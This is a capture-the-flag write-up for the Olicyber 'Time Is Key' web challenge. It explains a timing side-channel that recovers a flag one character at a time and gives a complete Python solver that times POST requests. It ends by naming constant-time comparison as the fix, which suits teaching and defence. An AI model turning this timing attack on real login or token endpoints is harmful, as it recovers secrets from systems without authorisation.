---
title: "Time Is Key — Timing Side-Channel Flag Extraction"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "timing-attack", "side-channel", "python"]
difficulty: "advanced"
summary: "The server compares the submitted flag character-by-character and returns a response proportional to how many correct characters were prefixed. Measure elapsed time per candidate character and pick the one with the longest response time to recover the flag byte by byte."
---

## The Challenge

A web endpoint accepts a POST with a flag guess. The server takes noticeably longer when more leading characters of the guess match the real flag — a classic timing oracle. There is no output other than a correct/incorrect response.

## Approach

For each position `i` in the flag:
1. Try every printable ASCII character `c` appended to the known prefix.
2. Pad the guess to a fixed total length (say 5 characters beyond the known prefix) to control the response time baseline.
3. Measure the round-trip elapsed time.
4. The candidate whose elapsed time exceeds `1 + len(known_prefix)` seconds (or is the maximum by a clear margin) is the correct character.

Once a character is confirmed, append it to the known prefix and repeat.

## Solution

```python
import requests, string, time

site = "http://time-is-key.challs.olicyber.it/"
charset = string.printable
flag = ""
PAD_LEN = 5

while True:
    best_char = None
    best_time = 0

    for c in charset:
        guess = flag + c + "a" * (PAD_LEN - 1)
        start = time.time()
        r = requests.post(site, data={"flag": guess})
        elapsed = time.time() - start

        if elapsed > 1 + len(flag):
            best_char = c
            break  # threshold crossed, confirmed

        if elapsed > best_time:
            best_time = elapsed
            best_char = c

    if best_char is None or best_char == "}":
        flag += "}"
        break

    flag += best_char
    print(f"[+] flag so far: {flag}")

print("FLAG:", flag)
```

The threshold `1 + len(flag)` corresponds to the server sleeping 1 second per correct prefix character (the challenge's timing mechanism). When a character's elapsed time crosses this threshold it is immediately accepted. If no threshold is crossed, the character with the maximum elapsed time is chosen.

## What I Learned

Timing side-channels are real even over the internet — network jitter averages out over repeated measurements. The mitigation is constant-time comparison: `hmac.compare_digest()` in Python compares the full string regardless of where the first difference occurs, producing a fixed-length execution path with no timing signal.
